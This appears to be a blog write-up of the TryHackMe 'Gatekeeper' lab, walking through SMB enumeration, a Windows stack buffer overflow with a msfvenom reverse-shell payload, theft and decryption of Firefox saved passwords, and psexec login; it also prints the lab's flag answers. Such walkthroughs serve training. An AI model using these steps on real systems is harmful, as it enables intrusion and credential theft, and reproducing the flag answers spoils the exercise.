---
layout: post
title: Gatekeeper
date: 2023-04-17 11:00 +0700
categories: [THM, medium]
---

### Introduction

[Gatekeeper] is a medium CTF on TryHackMe. On this machine, we will have to create an exploit to perform a buffer overflow and an escalation of privileges by decrypting credentials.

![Gatekeeper](https://tryhackme-images.s3.amazonaws.com/room-icons/8979e58d84147f0720773889be95f4d9.jpeg)


---

Let's start scanning the machine with nmap.

We can see some ports open.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![scan](/images/THM/gatekeeper/Captura.PNG)

There is a service in the port 31337, that is little estrange.

```sh
nc <IP> <Port>
```

![nc elite](/images/THM/gatekeeper/Captura2.PNG)

Let's see what we can get from SMB.

We can see, we've permissions on the **Users** folder.

```sh
smbmap -H <IP> -u guest -p ""
```

![smbmap](/images/THM/gatekeeper/Captura3.PNG)

Here are a folder called **Shared**.

```sh
smbmap -H <IP> -u guest -p "" -r 'Users'
```

![smbmap users](/images/THM/gatekeeper/Captura4.PNG)

We can see the folder contains an exe program called **gatekeeper.exe**.

```sh
smbmap -H <IP> -u guest -p "" -r 'Users\Share'
```

![smbmap share](/images/THM/gatekeeper/Captura5.PNG)

Time to download!

```sh
smbmap -H <IP> -u guest -p "" --download 'Users\Share\gatekeeper.exe'
```

![smbmap exe download](/images/THM/gatekeeper/Captura6.PNG)

If we strings the exe we can see that the exe is vulnerable to buffer overflow.  

```sh
strings <exe file>
```

![strings 1](/images/THM/gatekeeper/Captura7.PNG)

![strings 2](/images/THM/gatekeeper/Captura8.PNG)

Time to move to our windows machine with [Immunity debugger].

![Immunity](/images/THM/gatekeeper/Captura9.PNG)

Let's config our [mona] workingfolder.

```sh
!mona config -set workingfolder c:\mona\%p
```

![mona folder](/images/THM/gatekeeper/Captura10.PNG)

If we connect, we can see that is the same port and the same service that is in the server.

```sh
nc <Ip> <Port>
```

![broking](/images/THM/gatekeeper/Captura11.PNG)

We can see that we broken the program.

![Immunity broke](/images/THM/gatekeeper/Captura12.PNG)

Let's generate a pattern to find the offset.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

![pattern generate](/images/THM/gatekeeper/Captura13.PNG)

Time to insert the pattern!

```sh
nc <Ip> <Port>
```

![nc pattern](/images/THM/gatekeeper/Captura14.PNG)

Once the program is broken. We can see in the EIP the pattern we need to find to control the offset.

![Immunity EIP](/images/THM/gatekeeper/Captura15.PNG)

With the EIP value now we search for the offset.

We can see the offset is **146**.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 39654138
```

![pattern offset](/images/THM/gatekeeper/Captura16.PNG)

Let's generate with python another pattern to verify that we control the EIP.

```sh
python3 -c "print('A'*146+'B'*4+'C'*100)"
```

![python pattern](/images/THM/gatekeeper/Captura17.PNG)

```sh
nc <Ip> <Port>
```

![nc python pattern](/images/THM/gatekeeper/Captura18.PNG)

Once we have done that, we can see that we control the EIP because we can see the value **42** which is equivalent to the **B** in hexadecimal.

![Immunity EIP control](/images/THM/gatekeeper/Captura19.PNG)

Time to make our exploit, in my case I'll use python because I'm familiarized with it.

![Code in python](/images/THM/gatekeeper/Captura20.PNG)

Execute it to verify if it works.

```sh
python3 exploit.py
```

![execution](/images/THM/gatekeeper/Captura21.PNG)

We can see it works.

![Immunity python](/images/THM/gatekeeper/Captura22.PNG)

Now with **mona** let's generate a bytearray to find the badchars.

```sh
!mona bytearray -b "\x00"
```

![mona bytearray](/images/THM/gatekeeper/Captura23.PNG)

Now we include the badchars in our exploit.

![code badchars](/images/THM/gatekeeper/Captura24.PNG)

When we execute it and broke It. We need to look at the **ESP** and with mona we compare It.

```sh
!mona compare -d C:\mona\<exe file name>\bytearray.txt -a 014E19F8
```

![Immunity ESP](/images/THM/gatekeeper/Captura25.PNG)

We can see that the only BadChars there are **00, 0a**.

![mona badchars](/images/THM/gatekeeper/Captura26.PNG)

Now is time to find the jump point, mona can really help us to do this task.

Here we can see there are 2 addresses, Let's use the first one.

```sh
!mona jmp -r esp -cpb "\x00,\x0a"
```

![mona jmp pt](/images/THM/gatekeeper/Captura27.PNG)

Time to generate the payload, without the two BadChars and in this case let's use the **thread** option to making the thread die instead of the parent process.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<our IP> LPORT=<our port> EXITFUNC=thread -b "\x00\x0a" -f c
```

![payload debugger](/images/THM/gatekeeper/Captura28.PNG)

Here we've the exploit completed.

![exploit](/images/THM/gatekeeper/Captura29.PNG)

Let's start a listener.

```sh
nc -lvnp 4444
```

![nc listener](/images/THM/gatekeeper/Captura30.PNG)

If all is coded correctly, we've got back a shell.

We need to remember this shell is from our **Debugger Machine**.

![nc connect](/images/THM/gatekeeper/Captura31.PNG)

Now is time to generate the payload to the **target machine**.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<our IP> LPORT=<our port> EXITFUNC=thread -b "\x00\x0a" -f c
```

![payload target](/images/THM/gatekeeper/Captura32.PNG)

Here is the sample of the final exploit code, remember to change the IP target!

![final exploit](/images/THM/gatekeeper/Captura33.PNG)

Here we've got the shell in the target machine and we've exploited the buffer overflow.


```sh
nc -lvnp 4444
```

![nc connect](/images/THM/gatekeeper/Captura34.PNG)

Listing the directory, we can see there is the user flag.

```sh
dir
type user.txt.txt
```

![user flag](/images/THM/gatekeeper/Captura35.PNG)

- Locate and find the User Flag.?
>Answer: {H4lf_W4y_Th3r3}

Now is time to elevate our Privileges!

If we look around a bit when we listed the directory above, we find a **Firefox.lnk** file.

Let's copy **key4.db** and **logins.json** to the shared folder, so we can download them to our machine.

```sh
cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
copy key4.db C:\Users\Share\key4.db
copy logins.json C:\Users\Share\logins.json
```

![mozilla key](/images/THM/gatekeeper/Captura36.PNG)

There is a tool called [firepwd] that can decrypt Mozilla protected passwords.

```sh
git clone https://github.com/lclevy/firepwd.git
```

![firepwd clone](/images/THM/gatekeeper/Captura37.PNG)

We install the requirements.

```sh
pip3 install -r requirements.txt
```

![pip install](/images/THM/gatekeeper/Captura38.PNG)

And now is time to go and download the files we copy in the shared folder.

```sh
smbmap -H <IP> -u guest -p "" -r 'Users\Share'
```

![smb share](/images/THM/gatekeeper/Captura39.PNG)

Let's download the files!

```sh
smbmap -H <IP> -u guest -p "" --download 'Users\Share\key4.db'
```

![smb key](/images/THM/gatekeeper/Captura40.PNG)

```sh
smbmap -H <IP> -u guest -p "" --download 'Users\Share\logins.json'
```

![smb logins](/images/THM/gatekeeper/Captura41.PNG)

Now, with the two files in the same directory, we run the tool, and we will have the credentials back.

```sh
python3 firepwd.py
```

![firepwd cred](/images/THM/gatekeeper/Captura42.PNG)

Now with psexec let's connect to the machine with the credentials we decrypted.

```sh
python3 /usr/local/bin/psexec/py mayor:8CL701N78MdrCIsV@<IP>
```

![psec](/images/THM/gatekeeper/Captura43.PNG)

Now let´s go to the mayor Desktop and got the last flag!

With this we've completed the machine.

```sh
dir C:\Users\mayor\Desktop
type root.txt.txt
```

![root flag](/images/THM/gatekeeper/Captura44.PNG)

- Locate and find the Root Flag.?
>Answer: {Th3_M4y0r_C0ngr4tul4t3s_U}

[Gatekeeper]:https://tryhackme.com/room/gatekeeper
[Immunity debugger]:https://www.immunityinc.com/products/debugger/
[firepwd]:https://github.com/lclevy/firepwd
